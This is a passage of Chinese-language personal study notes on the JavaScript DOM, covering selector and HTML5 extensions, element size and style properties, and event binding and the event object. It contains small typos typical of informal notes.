    parentNode 的值为 null
    子节点可以是:
      Element ProcessingInstruction Text
      Commnet CDATASection EntityReference
    e.g. :
    通过文档片段来保存多个元素然后一次添加(若逐个添加,将导致浏览器反复渲染(呈现))
    <ul id="myList"></ul>
    var fragment =document.createDocumentFragment();
    var ul =document.getElementById("myList");
    var li =null;
    for(var i = 0; i < 3; i++) {
      li =document.createElement("li");
      li.appendChild(document.createTextNode("ietm" +(i +1)));
      fragment.appendChild(li);
    }
    ul.appendChild(fragment);
  CDATASection 类型:只针对基于XML的文档,表示CDATA区域
  框架「非节点类型之一」 
    框架和内嵌框架分别用 HTMLFrameElement 和 HTMLIFrameElement 表示.
    elem.contentDocument 表示执行框架的文档对象  「DOM2 IE8+」 
      此前无法直接通过元素获取到文档对象,只能使用frames集合.
    elem.contentWindow 返回框架的window对象 [所有都支持]
      然后.document 再获取到document对象
    实践:iframe 修改其跨域的内容,浏览器限制修改?
扩展 
  DOM扩展
    PS:DOM的两个主要扩展是 selector API(选择符API)和 HTML5,此外还有一些其他扩展
    ◆选择符 API
      众多JavaScript库中最常用的一项功能,根据CSS选择符来匹配DOM元素
      jQuery的核心就是通过CSS选择符查询DOM文档获得元素的引用
      由W3C发起指定的一个标准,致力于让浏览器原生支持CSS查询,
    elem.querySelector("selector"); 表示选择器对应的第一个html元素对象
      PS:没有则为null
        Document类型调用该方法时,会在文档元素的范围内查找匹配元素
        而通过Element类型调用该方法时,只会在该元素的后代元素内查找匹配的元素
      Arguments:
        selector可以为标签、类、id等等,也可以为组合选择器如 div.wrap
        selector 中的字符不可包含括号"()"字符
        若传入了不被支持的选择符,querySelector会抛出错误
      e.g.
        获取div内的span
        <div id="div"> <span id="span">1</span> </div>
        var div =document.querySelector("#div")
        var span =div.querySelector("#span");
    elem.querySelectorAll("selector"); 得到一个该选择器对应的所有html元素组成的一个数组
      返回值为一个"静态"(不会自动更新自己)的只包含元素的NodeList,无匹配项则为空 NodeList
      可通过下标或item()方法来获取单个元素
    elem.matchSelector("selector"); 返回布尔值,表示该元素是否与该选择符匹配
      Selector API Level 2 规范为 Element类型新增的一个方法
    ◆Element Traversal 规范
      对于元素间的空格,IE9及之前版本不会返回文本节点,
      而其他浏览器都会返回文本节点,导致使用childNodes firstchildNodes等属性不一致
      为了弥补这一差异,同时保持DOM规范不变,Element Traversal 规范新定义了一组属性
    elem.childElementCount; 返回子元素的个数(不包括文本节点和注释)
    elem.firstElementChild; 第一个子元素(firstChild 的元素版)
    elem.lastElementChild; 最后一个子元素(lastChild 的元素版)
    elem.previousElementSibling; 前一个兄弟元素(previousSibling 的元素版)
    elem.nextElementSibling; 后一个兄弟元素(nextSibling 的元素版)
    ◆HTML5
      HTML5使用新增标记定义了大量JS API,其中一些API与DOM重叠
      由于HTML5定义的东西很多,此处只讨论与DOM节点相关的内容
      // 与类相关的扩展
    elem.getElementsByClassName(clsName[,parent]); 通过类名来匹配所有符合元素的类数组
      PS:IE10以前不支持
      Arguments:一个包含一个或多个类名的字符串;
        传入多个类名时,类名的先后顺序无影响
      RetValue:返回带有指定类的所有元素的(动态的)NodeList
      e.g. :
      获取所有类中包含 "user" 和 "name" 的元素(类名的先后顺序无所谓)
      var aoo =document.getElementsByClassName("user name");
    elem.classList; 返回 DOMTokenList 集合类型的一个实例 「详见 归纳总结」
    document.activeElement; 始终引用DOM中当前获得焦点的元素
      PS:
        默认情况下,文档刚加载完,document.activeElement 中保存的是document.body元素
        加载期间 document.activeElement 的值为 null
    document.hasFocus(); 检测文档是否获得了焦点,返回布尔值
    document.readyState; 表示文档的加载状态(loading 和 complete)
    document.compatMode; 浏览器的渲染模式
      IE6开始区分渲染页面的模式是标准的还是混杂的,
      IE为此给document添加了一个 compatMode 属性
      标准模式下,值为 "CSS1Compat";混杂模式下,值为 "BackCompat"
    document.head; 引用文档的<head>元素
      支持该属性的浏览器有 Chrome 和 safari
    document.charset;  取/设文档使用的字符集
    document.defaultCharset;  浏览器及操作系统charset的默认设置
    elem.dataset.XX;    获取自定义元素的属性的值,类型为字符串
      PS:HTML5规定可以为元素添加非标准的属性,
        但要添加前缀 data-,目的是为元素提供与渲染无关的信息或提供语义信息
        elem.dataset 是 DOMStringMap 的一个实例
      IE下html标签自定义属性
        元素对象.属性名 方式来获取(仅IE支持该方式)
        使用 元素对象.getAttribute("属性名") 来获取
        e.g.
          定义div标签的abc属性,值为aaa
          <div abc="aaa">123</div>
    elem.innerHTML;   取/设元素的文本和标签,但不包括自身的标签,返回值为字符串
      PS:各个浏览器返回的值可能不完全一样(如是否带空格,大小写问题等)
        在大多数浏览器中通过该方法插入<script>元素并不会执行其中的脚本
        并非所有元素都支持innerHTML属性,不支持的元素有:
          col colgroup frameset head html style table tbody thead tfoot tr
      关于常用的innerHTML属性和节点操作方法发的比较,
        在插入大量HTML标记时使用innerHTML的效率明显要高很多.
        在设置innerHTML时,会创建一个HTML解析器.
        这个解析器是浏览器级别的(C++编写),因此执行javascript会快的多
      IE8提供了一个类似的方法 window.toStaticHTML()方法
        接收一个HTML字符串,
        返回一个经过处理后的版本(从原HTML中删除所有脚本节点和事件处理程序属性)
      e.g. :
      当创建和销毁HTML解析器也会带来性能损失,最好控制在最合理的范围内.如下:
      for(var i=0;i<10;i++){ ul.innerHTML="<li>items</li>";  }
      //每次循环创建解析器,影响性能
      改为
      for(var i=0;i<10;i++){ a=a+"<li>items</li>"; }
      //临时保存
      ul.innerHTML=a;
    elem.outerHTML; 获取元素的自身标签及其innerHTML
    elem.insertAdjacentHTML("位置","html代码"); 在指定位置插入HTML代码
      PS:该方法最早在IE中出现
        html代码会在html网页中自动转换为html元素
      Arguments:
        定义位置的术语:beforebegin/afterbegin/beforeend/afterend.
      RetValue:undefined
      e.g.
      a.insertAdjacentHTML("beforeBegin",`
        <a href="https://www.baidu.com">这是一个到百度的链接</a>
        `)
    elem.scrollIntoView();通过滚动浏览器窗口或某个容器元素使元素出现在视口中
      PS:实际上,为某个元素设置焦点也会导致浏览器滚动并显示出该元素
      Arguments:传入一个布尔值,默认为true
        true 让调用元素的顶部与视口顶部尽可能平齐
        true 让调用元素尽可能全部出现在视口中(若可能的话,会使底部与底部平齐)
    innerHTML outerHTML insertAdjacentHTML 的使用说明
      该方法可能导致浏览器的内存占用问题,IE中问题更加明显,
      如删除某个元素后,元素与事件处理程序之间的绑定关系并未删除,若频繁出现导致内存占用过多
      最好先手工删除要被替换的元素的所有事件处理程序和JS对象属性
  专有扩展
    仍然有大量的专有的DOM扩展没有成为标准,(即此时还是专有功能,只得到了少数浏览器的支持)
    文档模式
      IE8引入了一个新的概念叫"文档模式",
      文档模式决定了可以使用什么功能,以及如何对待文档类型(doctype)
    elem.children;   所有子元素节点组成的一个类数组
      PS:HTMLCollection的实例;当只包含子元素节点时,children和childNodes相同
        每个子元素包含其所有的自身后代元素
        此属性不是符合W3C标准规范的属性,可以获取指定元素的子元素,
        支持的浏览器有IE5+ Firefox Safari Opera Chrome
        IE8及更早版本的children属性中会包含注释节点,IE9后则只包含元素节点
    elem.contains(); 判断是否包含子节点,返回值为布尔值
      PS:IE率先引入的方法
      DOM level3 的 compareDocumentPosition() 也能能够确定节点间的关系
        RetValue:数值,表示该关系的位掩码(bitmask)
          1     无关(给定的节点不再当前文档中)
          2     居前(给定的节点在DOM树中位于参考节点之前)
          4     居后(给定的节点在DOM树中位于参考节点之后)
          8     包含(给定的节点是参考节点的祖先)
          16    被包含(给定的节点是参考节点的后代)
    elem.innerText;  取/设元素中包含的所有文本内容.
      PS:IE 引入的 element.innerText
      innerText 会受样式的影响,它不返回隐藏元素的文本,但 textContent 返回.
      由于 innerText 受 CSS 样式的影响,它会触发重排(reflow),但textContent 不会.
      与 textContent 不同的是, 在 IE11=- 中对 innerText 进行修改,不仅会移除当前元素的子节点,而且还会永久性地销毁所有内部文本节点(由此导致无法再将这些被销毁的文本节点插入到当前元素或任何其他元素中).
      读取值时,它会按照有浅入深的顺序将子文档树中的所有文本拼接起来
      写入值时,则会取代元素的所有子节点
        会对文本中存在的HTML语法字符(如小于号等)进行编码转义(如&lt;)在网页中如实显示出.
    nod.textContent; 取/设元素中包含的所有文本内容  [DOM Level3] [IE9=+支持]
      PS:innerText 返回值会忽略行内样式和脚本,但textContent则会返回行内样式和脚本代码.
        对象为 Document,DocumentType 或者 Notation 类型节点,则 textContent 返回 null
        如果你要获取整个文档的文本以及CDATA数据,
        可以使用 document.documentElement.textContent.
        如果节点是个CDATA片段,注释,ProcessingInstruction节点或一个文本节点,
        textContent 返回节点内部的文本内容(即 nodeValue).
        对于其他节点类型,textContent 将所有子节点的 textContent 合并后返回,
        除了注释、ProcessingInstruction节点.
        如果该节点没有子节点的话,返回一个空字符串.
        在节点上设置 textContent 属性的话,会删除它的所有子节点,并替换为给定的文本节点.
    elem.outerText;  取/设元素及其包含的所有文本内容
      PS:读取文本时,innerText等价于outerText
        设置文本时,outerText会替换该元素及其所有子元素
    ◆对 HTMLElement 类型的扩展
    elem.scrollIntoViewIfNeeded(bool); 将不再视口中的元素滚到到视口中
      当参数设置为true时,则表示尽量将元素显示在视口中部(垂直方向)
    elem.scrollByLines(num);  将元素的内容滚动指定的行高
      num值可为正或负
    elem.scrollByPages(num);  将元素的内容滚动指定的页面高度,具体高度有元素的高度决定
  元素大小(不属于 DOM2级样式 规范,IE率先引入,所有浏览器都已支持)
    偏移量
      elem.offsetHeight; 垂直方向的大小,以像素计.
      elem.offsetHeight; 水平方向的大小,以像素计.
      elem.offsetLeft;  元素左边框到父元素左边框间的像素值
      elem.offsetTop;   元素上边框到父元素上边框间的像素值
      elem.offsetParent; 父元素(offsetLeft 和 offsetTop 与父元素有关即offsetParent)
    客户区大小 :元素内容及其内边距所占空间大小(边框以内不包括边框、滚动条等)
      elem.clientWidth;
      elem.clientHeight;
    滚动大小 : 指包含滚动内容元素的大小
      elem.scrollHeight; 元素内容总高度
      elem.scrollWidth;  元素内容总宽度
      elem.scrollLeft; 被隐藏的内容左侧的像素值,通过设置可改变元素滚动位置
      elem.scrollTop;  被隐藏的内容上方的像素值,通过设置可改变元素滚动位置
    确定元素大小
      elem.getBoundingClientRect();
      返回一个对象,包含left top right bottom4个属性,表示元素相对于视口的位置
  DOM2遍历和范围  [更多详见 JavaScript高级程序设计 327 页]
DOM操作归纳总结 
  创建 elem 
    var img = new Image(); 创建图片对象 
      e.g. img.src="图片地址"
    var opt = new Options(["文本","值",bool,bool]); 创建option对象 
      两个 bool 分别表示是否被选中和是否有效
      [详见 表单脚本]
      e.g.:
      var elem=document.getElementById('mySelect');
      elem.add(new Option("文本","值")); // 这个只能在IE中有效
      // 这个兼容IE与firefox
      elem.options.add(new Option("text","value"));
      elem.options.remove(index); // 根据下标删除选项option
      elem.options[index].text;
    document.createElement("元素名a"); 创建元素对象,创建一个空元素a 
      (详见: 节点类型&详解 Document 创建)
    nod.cloneNode(bool); 复制节点「详见: Node节点」 
  获取 elem 
    快捷方法获取
      document.documentElement  HTML元素
      document.body HTML的body
        等价于 document.querySelector("body");
      document.head HTML的head节点
      id名称 JS中直接使用元素的id名称即代表该元素
        前提是id名称是一符合标准的变量名称
        e.g.:
          <div id="box"> </div>
          box.innerHTML = '直接使用id名称就可以了';
    选择器获取
      elem.querySelector("selector")  获取元素对象
        (详见:扩展 DOM扩展)
      elem.querySelectorAll("selector") 获取一组元素,返回值为数组
        (详见: DOM扩展)
      elem.getElementById("idname") id获取元素对象
        (详见: DOM>document)
      elem.getElementsByTagName('tagName') 元素名获取元素对象
        (详见: DOM>document)
      elem.getElementsByName() name属性获取
        (详见: DOM>document)
      elem.getElementsByClassName('className') 通过类名元素的集合
        (详见: DOM扩展 HTML5)
    通过元素
      ◆DOM结构层级关系
      elem.closest(selectors) 获取元素最近的祖先元素
        (也可以是当前元素本身)
        [IE11不支持]
        如果匹配不到,则返回 null
      elem.parentElement 父元素
        返回值为子元素elem 的父元素对象(包括elem的兄弟元素及后代元素)
      nod.parentNode 父节点
        [详见 Node节点]
      elem.previousElementSibling 前一个兄弟元素(previousSibling 的元素版)
        [详见 扩展 DOM扩展]
      elem.nextElementSibling 后一个兄弟元素  [详见 DOM扩展]
      elem.children 所有子元素的集合
        (详见: 专有扩展)
      elem.firstChild 第一个子节点
      elem.lastChild 最后一个子节点
      ◆其他信息获取
      elem.offsetParent 只读,最近的包含该元素的定位元素
        PS: 若无定位元素,则为body;当元素display:none,其offsetParent为null;
  操作 elem 
    元素增删查改 
      nod1.hasChildNodes(nod2); nod1是否包含nod2
      elem.insertAdjacentHTML("位置",`html字符串`); 插入HTML代码
       (详见: DOM扩展 HTML5)
      elem1.insertAdjacentElement("位置",elem2);  在elem1中插入elem2
        PS：返回值为elem2
      Nod.appendChild(子元素a);  在父元素b内的最后位置添加一个子元素a
        (详见:节点 Node节点)
      Nod.insertBefore(); 在父元素b内添加一个子元素a
        (详见:节点 Node节点)
      Nod.removeChild();  删除子元素
        (详见: Node操作部分)
      Nod.replaceChild(); 替换子元素 (详见: Node操作部分)
      elem.remove();     删除元素 [可能有兼容问题] [IE11不支持]
    元素的尺寸、位置
      PS：为方便描述,设定 元素的边界宽为content+padding+border+margin,
        元素布局宽为content+padding+border,元素内宽为content+padding,
        元素宽为content的宽度「在box-sizing:content-box的默认条件下」
        高度同理;
        当元素出现滚动条时,元素不会'膨胀',只会'挤压'其内部元素;
      elem.offsetHeight 元素布局高「DiBs」 
        包含scrollbar
        和元素内部的内容是否超出元素无关,只和width和border有关
      elem.offsetWidth  元素布局宽「DiBs」
      elem.offsetTop    元素相对其offsetParent「定位的父元素」的top
      elem.offsetLeft   元素相对其offsetParent「定位的父元素」的left
      elem.clientWidth    只读,元素内宽 
        不包括边框(IE下包括)、滚动条部分
          windows 中出现滚动条时为 content+padding-滚动条的宽度
          mac 中滚动条在未拖动时自动隐藏,因此不影响 
        无padding和滚动条时 clientWidth 等于 style.width
        e.g. : 获取浏览器窗口的高和宽
          function getViewport(){
            var obj = {};
            if(document.compatMode == "BackCompat"){
              obj.width = document.body.clientWidth;
              obj.height = document.body.clientHeight;
            } 
            else {
              obj.width =  document.documentElement.clientWidth;
              obj.height = document.documentElement.clientHeight;
            }
            return obj;
          }
          大多数情况下,都是document.documentElement.clientWidth 返回正确值.
          但在IE6的quirks模式中,document.body.clientWidth 返回正确的值,
          因此函数中加入了对文档模式的判断.
      elem.clientHeight   只读,元素内高 
      elem.clientTop      'border-top-width'的值
      elem.clientLeft     'border-left-width'的值
      elem.scrollWidth  布局宽+滚动隐藏宽
        包括元素的padding,但不包括元素的margin
        document.body.scrollWidth 在其布局宽和浏览器宽中取较大者,高度同理;
      elem.scrollHeight 布局高+滚动隐藏高 
      elem.scrollTop    读写,元素垂直滚动距离
      elem.scrollLeft   读写,元素水平滚动距离
      elem.scrollIntoView() 将节点滚动到可视窗口中 
      elem.getBoundingClientRect() 返回一对象,用于获得元素相对视口的位置「DiBs」
        elem.getBoundingClientRect().width  元素宽
        elem.getBoundingClientRect().height 元素高
        elem.getBoundingClientRect().top    元素顶部到可视区顶部的距离
        elem.getBoundingClientRect().bottom 元素底部到可视区顶部的距离
        elem.getBoundingClientRect().left   元素左侧到可视区左侧的距离
        elem.getBoundingClientRect().right  元素右侧到可视区左侧的距离
      可视区域宽高兼容写法
        var width = window.innerWidth || document.body.clientWidth || document.documentElement.clientWidth;
        var height = window.innerHeight || document.body.clientHeight || document.documentElement.clientHeight ;
    元素的属性
      elem.attributes 元素所有属性的集合
        (详见 HTMLElement 类型)
      elem.style   一个元素样式的对象,行内样式 
        PS：style.xx 的值需要事先定义在html标签里「CSS中也不行」,否则获取不到,
          返回值为字符串,如 style.left 返回 '20px';
        elem.style.left   读写,相对于具有定位属性父元素的left 
        elem.style.width  读写,元素宽
        elem.style.cursor 显示的指针「光标」的类型
      elem.classList 元素所有class的集合
        PS: firefox 和 Chrome 支持该属性
        elem.classList.length  获取类的个数
        elem.classList[] 或 elem.classList.item();  获取元素
        elem.classList.contains("类名"); 返回是否包含指定类的布尔值
        elem.classList.add("类名");      将指定类加到元素的类列表中
          若存在类b,则不添加,否则添加(即始终只存在一个类b)
        elem.classList.remove("类名");   从元素的类列表中删除指定类
          若存在类b则删除,否则无动作
        elem.classList.toggle("类名");   元素列表中若有该类则删除,没有则加上
      elem.className 读写元素的class字符串形式包括空格
      elem.hasAttributes() 元素是否有属性的布尔值
      elem.hasAttribute("属性名") 元素是否有指定属性的布尔值
      elem.getAttribute("属性名"); 获取元素指定属性的值  [详见: HTMLElement]
        elem.getAttribute("value") input表单中value的值 [不会实时动态的更新]
          var a = elem.getAttribute("value")
          返回值为input的值,html中指定的值,相当于 elem.defaultValue;
        e.g.:
          elem.getAttribute('class'); // 获取class属性的值
      elem.setAttribute("属性名","属性值") 设置指定属性的值
        (详见: HTMLElement)
      elem.removeAttribute("属性名") 删除属性 [详见: HTMLElement 类型]
        e.g.:
          elem.removeAttribute("class");
      ◆自定义属性
      elem.dataset.XX;  获取自定义元素属性的值 [详见: DOM扩展>HTML5]
      elem.dataset.XX = 'XXX' 设置自定义属性的值 [DOM中出现 data-XX='XXX']
      delete elem.dataset.XX 删除指定属性的值
      ◆其他属性的快捷获取
      elem.属性名;  读写元素属性值
        contentEditable  是否可编辑
        value  设置/获取input的值,即输入框中的字符,实时动态的值
    元素的信息
      elem.tagName;  元素/标签名称,类型为字符串
        返回值如 DIV
        或使用: elem.nodeName
      elem.nodeName;    元素标签名称(大写字母)
      elem.outerHTML; 获取元素的自身标签及其innerHTML
      elem.innerHTML; 读写元素标签内的所有内容的字符串表示
        (详见: DOM扩展>HTML5)
      elem.outerText; 取/设元素及其包含的所有文本内容
        (详见: DOM扩展>HTML5)
      elem.innerText;   获取/赋值设置元素的文本内容
        (详见: 专有扩展)
        只能在body的范围内起作用
      elem.textContent  一个节点及其内部节点的文本内容
        [详见 专有扩展]
        和 innerText 类似
      elem1.contains(elem2); 判断elem1是是否包含elem2
      window.getComputedStyle(elem) 指定元素节点的最终样式信息的对象
        所谓“最终样式信息”,指的是各种CSS规则叠加后的结果
        还可以接受第二个参数,表示指定节点的伪元素,比如:before、:after、:first-letter等
        返回的CSS值都是绝对单位
          比如,长度都是像素单位(返回值包括px后缀)
          颜色是rgb(#, #, #)或rgba(#, #, #, #)格式.
        CSS规则的简写形式无效
          比如,想读取margin属性的值,不能直接读,
          只能读marginLeft、marginTop等属性.
        如果一个元素不是绝对定位,top和left属性总是返回auto.
        该方法返回的样式对象的cssText属性无效,返回undefined.
        该方法返回的样式对象是只读的,如果想设置样式,应该使用元素节点的style属性.
        兼容写法
          getComputedStyle方法在IE8以及更早的版本中没有实现,
          但是IE中每个元素有自己的currentStyle属性.
          var styleObj = getComputedStyle ? getComputedStyle(elem, "") : elem.currentStyle;
          var width = styleObj.width;　　//100px;
      elem.childElementCount 子元素数量
      elem1 === elem2 判断两个元素节点是否相同
      elem.naturalWidth/naturalHeight 只读,表示image对象真实的宽、高
    元素的状态
      elem.blur();   使元素失去焦点
      elem.focus();  使元素获得焦点
        在ios中该方法存在限制,
          直接调用失效; load、input等事件cfoo中失效,click事件cfoo中成功;
          当click中的cfoo可执行时,而通过其他方法或事件触发click,则无法获取焦点;
    操作style样式
      方法一:通过给元素添加class来操作样式
      方法二:直接操作内联样式 elem.style.XX = XXX
        PS:CSS中使用"-"进行连接的属选采用驼峰命名法来代替,
          如background-image,改写为backgroundImage
        elem.style.cssText;   取/设整个style
        e.g. :
          添加背景图片
          elem.style.backgroundImage= `url(${img.src})`;
      操作 CSS
        elem.style.属性名;  读写行内样式
          style属性仅仅只能读写行内的CSS样式.对于内联和链接方式则无法获取.
          elem.style;         CSSStyleDeclaration,样式对象
          elem.style.color;          样式的颜色值
          elem.style.fontSize;       //20px,font-size需改写为fontSize.
          elem.style.cssFloat;       //非IE浏览器调用方法
          elem.style.styleFloat;     //IE浏览器调用方法
          //总结为(跨浏览器兼容)
          elem.style.cssFloat||elem.style.styleFloat;
          typeof box.style.cssFloat!="undefined"?box.style.cssFloat="right":box.style.styleFloat="right";
          elem.style.cssText;         //查看CSS文本.
          elem.style.background="#ccc";  背景色
        链接样式
          var link =document.getElementsByTagName('link')[0]
          var sheet =link.sheet;      //IE有问题
          var sheet =link.stylesheet; //IE的方法
        内联或链接样式获取
          var sheet =document.styleSheets[0];
          // 返回值为样式表的集合.
          sheet.disabled    若样式被禁用返回true,否则为false.
          sheet.disabled =true ;  禁用该样式
          sheet.href;   返回值为样式的路径.
        css的样式规则
          sheet.cssRules[x];               得到第x+1 个规则
          sheet.cssRules[0].cssText;       得到第一个规则的css文本
          sheet.cssRules[0].selectorText;  得掉第一个规则的选择符
          sheet.deleteRule(0);             删除第一条规则
          sheet.insertRule("body{background-color:red}",0);
          //在第0+1个位置上添加一条规则
          IE获取rules方法
            sheet.rules;
            sheet.removeRules(0);
            sheet.addRule("body","background-color:red",0);
          window.onload =function(){
            var sheet =document.styleSheets[0];
            var rules =sheet.cssRules||sheet.rules;
            var rule1 =rules[0];
            rule1.style.color ='red';
          }
        获取计算后的样式
          e.g.:
            //可获取计算后的样式(计算后的样式包括设置后的样式和默认样式)
            var box=document.getElementById("box");
            var style=window.getComputedStyle(box,null);
            console.log(style.color);
            //IE的计算样式获取
            var style=box.currentStyle;
            console.log(style.color);
            // 兼容写法
            var style = window.getComputedStyle?
              window.getComputedStyle(box,null)||box.currentStyle;
            style.fontSize;
          获取样式的兼容写法函数
          var getStyle = function(elem, attr) {
            return elem.currentStyle ? elem.currentStyle[attr] : getComputedStyle(elem, false)[attr];
          };
          getStyle(document.getElementById('test'), 'height');
    其他操作
--------------------------------------------------------------------------------
◆Event 事件 
  PS:
    JS与HTML的交互时通过事件实现的
    事件是用来处理响应的一个机制.当用户执行某些操作的时候,在去执行一些列代码
    响应可以来自于用户(鼠标点击等),也可以来自浏览器(如文件下载完了).
    浏览器会默认给事件的响应函数添加一个参数,该参数表示该事件对象本身.
  事件流
    事件流描述的是从页面中接收事件的顺序
    IE的事件流是事件冒泡,从内向外传递
      事件从子元素向父元素(从内向外)传递,直到最外层浏览器(document)接收到该事件停止
      事件冒泡的前提是目标元素在文档中,移除目标文件则会阻止冒泡.
    Netscape的事件流是事件捕获,从外向内传递
      事件从最外层浏览器向内(从外向内)传递,直到传递到触发事件的该元素为止.
事件支持检测 
  var div = document.createElement('div');
  //是否支持触摸事件
  console.log('ontouchstart' in div);            // false
  //是否支持方向转换事件
  console.log('onorientationchange' in window);  // false
事件绑定、解绑及触发 
  PS:响应某个事件的函数就叫做事件处理程序(或事件侦听器)
    事件处理程序的名字以"on"开头加上事件名
    函数中 this 等于 事件的目标元素
  HTML事件处理程序「也叫内联事件处理程序」 
    在内联模型中,事件处理函数是html标签的一个属性,用于处理指定事件.
    e.g. :
    <input type="button" value="clickme" onclick="alert('点击')">
  DOM0级事件处理程序: 将一个函数赋值给一个事件处理程序属性
    PS:事件处理组成:元素对象.事件处理函数=函数
      当添加多个相同的事件(而执行函数不同),会产生覆盖
    e.g. :
      document.onclick=function(){ alert("abc"); }; //单击文档任意处

      bar btn =document.getElementById("myBtn");
      btn.onclick =function(){ };  // 绑定事件
      btn.onclick =null;            // 解除绑定
  DOM2级事件处理程序: addEventListener&removeEventListener
    PS:DOM2级事件定义了两个方法,用于添加事件和删除事件处理程序的操作.
      所有DOM节点中都包含这两个方法.
      当一个元素被绑定多个相同类型事件时,都会执行,无覆盖
      同一元素的绑定不同的事件其被调用的顺序不依赖于绑定的顺序,
      绑定多个相同的事件则会按照定义的先后顺序来触发.
      IE8 及之前不支持w3c的事件绑定(IE9之后支持)
    elem.addEventListener("事件名",事件函数,bool);   事件绑定
      PS:通过该方式添加的事件,只能使用removeEventListener来移除
      bool  可选,表示是否使用捕获的布尔值,默认为false
    elem.removeEventListener();     解除绑定
      Arguments:传入与addEventListener()同样的三个参数,
        执行函数必须是同一引用而非相同的不同引用.
        若要要移除事件,需使用外部函数,
        若为匿名函数,则该事件无法移除.
      Remarks:
        在使用 innerHTML 移除有事件绑定的元素时,
        可能导致元素被移除后事件仍保留在内存中,大量的类似操作导致内存占用过多,
        可在移除元素前解除该元素事件的绑定.
  IE事件处理程序 attachEvent&detachEvent
    PS:IE实现了与DOM中类似的两个方法
      执行函数中的this为window
      同DOM方法类似,可以添加多个相同的事件(执行函数不同),而不产生覆盖
      绑定多个事件,执行的先后顺序为先添加后执行(与DOM方法相反)
    elem.attachEvent("on事件名",函数);  绑定事件
      e.g. :
      elem.attachEvent("onclick",function(){ });
    elem.detachEvent();   解除绑定
      匿名函数不可解除绑定
      和attachEvent接收同样的参数(同一个函数的引用,而非相同的不同引用)
  事件处理函数返回值
    大多数情况下,事件处理函数返回false,可以阻止默认事件行为
      仅仅是在HTML事件属性和DOM0级事件处理方法中,
      才能通过返回 return false 的形式阻止事件宿主的默认行为(?)
    e.g. :
    点击链接,返回false,阻止跳转
    <a id="a" href="https://www.baidu.com">点我也不会跳转</a>
    var a =document.querySelector("#a");
    a.onclick =function(){ return false; };
    a.addEventListener("click",function(){return false; });// 不生效
  事件的绑定与移除
    PS:
      若要移除事件句柄,addEventListener() 的执行函数必须使用外部函数,
      匿名函数,类似 "elem.removeEventListener("event", function(){ myScript });" 该事件是无法移除的
    elem.addEventListener("mousemove", myFunction);    // 向 元素添加事件句柄
    elem.removeEventListener("mousemove", myFunction); // 移除 元素的事件句柄
    定义和用法
    removeEventListener() 方法用于移除由 addEventListener() 方法添加的事件句柄
event 事件对象 
  PS:在触发DOM上的某个事件是,会产生一个事件对象event,
    这个对象包含着所有与事件有关的信息.
    事件对象包括导致事件的元素、事件的类型、以及其他与特定事件相关的信息.
    所有浏览器都支持event对象,但支持的方式不一定相同.
    event会被作为参数传到执行函数中.
    event对象与创建的事件有关,触发的事件类型不一样可用的属性/方法也不同
    只有在事件处理程序执行期间,event对象才存在「一旦执行完则会被销毁」
  e.g. 验证隐藏的参数
    //普通空参函数
    function box(){console.log(arguments.length);}
    box(); // 0,没有得到任何传递的参数
    document.onclick =function(){
      console.log(arguments.length); // 1,得到一个隐藏参数
      console.log(arguments[0]);     //MouseEvent {……},鼠标事件对象
    通过参数获取事件对象
      window.onload=function(){
        document.onclick=function(evt){
          // 兼容模式
          var e=evt||window.event;
          // IE使用window.event来表示事件对象
          alert(e);
        };
      };
  ◆公有属性/方法
  e.target;      事件的目标
    目标元素在文档中是事件冒泡的前提(即删除目标元素也会阻止事件冒泡)
  e.currentTarget;  表示绑定的元素「即在函数中的this」
    若直接将事件绑定在目标元素上,则this currentTarget target 相同
  e.type;        返回事件类型
  e.preventDefault();  阻止事件的默认行为
    若cancelable是true则可以使用该方法
  e.stopPropagation(); 取消事件的进一步捕获或冒泡
    PS:前提bubbles为true,用于阻止事件的传递.
    e.g. :
    var btn =document.getElementById("myBtn");
    btn.onclick =function(e){
      alert("1");
      e.stopPropagation();  // 否则会触发body的点击事件
    }
    document.body.onclick =function(){
      alert("2");
    }
  e.bubbles;     表示事件是否冒泡的布尔值
  e.cancelable;  表名是否可以取消事件默认行为的布尔值
  e.defaultPrevented; 表示是否已经调用了preventDefault()的布尔值
    DOM3级事件中新增
  e.detail;     与事件相关的细节信息
  e.eventPhase; 调用事件处理程序阶段的描述数值
    1 表示捕获阶段;2 表示"处于目标";3 冒泡阶段
    e.g. :
    var btn =document.getElementById("myBtn");
    btn.onclick =function(e){console.log(e.eventPhase);} // 2
    document.body.addEventListener("click",function(){
      console.log(e.eventPhase);  // 1
    },true)
    document.body.onclick =function(e){
      console.log(e.eventPhase);  // 3
    }
    当eventphase等于2是,this target currentTarget 是相等的
  e.stopImmediatePropagation()  取消事件传递,并阻止处理程序调用
   (DOM3新增)
  e.trusted;    表示事件是否为浏览器生成的布尔值(DOM3级新增)
  e.view;       与事件关联的抽象视图,等同于发生事件的window对象
  ◆鼠标事件的位置信息
  e.screenX     相对于设备屏幕左上角的坐标
  e.clientX     相对浏览器可视区左上角的坐标
    不含浏览器的工具栏、边框和滚动条
    返回值类型为数值,但默认是以px为单位返回的数值.
  e.pageX       相对于整个网页左上角的坐标
    页面没滚动时 clientX 和 pageX 相等
  e.offsetX     相对于事件源左上角的坐标
    如点击一div,则表示到该div左上叫的坐标
  e.x           相对于CSS定位的最内层包容元素的左上角
    IE最先引入,现在主流浏览器基本都支持;
    在Chrome中和clientX相同;在IE中当设置了定位则和offsetX相同,否则和clientX相同;
  ◆修改键「鼠标、键盘事件」
    在按下鼠标时键盘上某些键的状态也可以影响到所要采取的操作
    修改键如:Shift Ctrl Alt Meta(Windows中为Windows键,Mac中为Cmd键)
  e.shiftKey 布尔值,表示该键是否被按下
  e.ctrlKey  布尔值,表示该键是否被按下
  e.altKey   布尔值,表示该键是否被按下
  e.metaKey  布尔值,表示该键是否被按下
  IE中的事件对象
    ◆DOM1级中,event作为window对象的属性存在,IE8及之前
      e.g. :
      var btn =document.getElementById("myBtn");
      btm.onclick =function(){var e = window.event;console.log(e.type);} // click
    ◆DOM2级中,attachEvent将event作为事件函数的参数,也可使用window.event 访问.
      属性/方法的获取也同DOM的event一样
    e.srcElement 返回事件目标(同e.target)
    e.type
    e.cancelBubble
      e.cancelBubble =true;  取消事件冒泡
    e.returnValue
      e.returnValue =false; 阻止事件默认行为
事件分类 
  ◆DOM3级规定了一下几类事件
  UI(User Interface,用户界面)事件  当用户与页面上的元素交互时触发
    PS:不一定与用户操作有关
      除DOMActivate之外,其他事件在DOM2中都归为HTML事件
    DOMActivate 表示元素已经被用户操作(通过鼠标或键盘)激活 (DOM3级中废弃)
    load    加载完后触发
      当页面完全加载后(包括所有图像、JS文件、CSS文件等外部资源)在window上触发,
      在所有框架都加载完毕时在框架集上面触发,
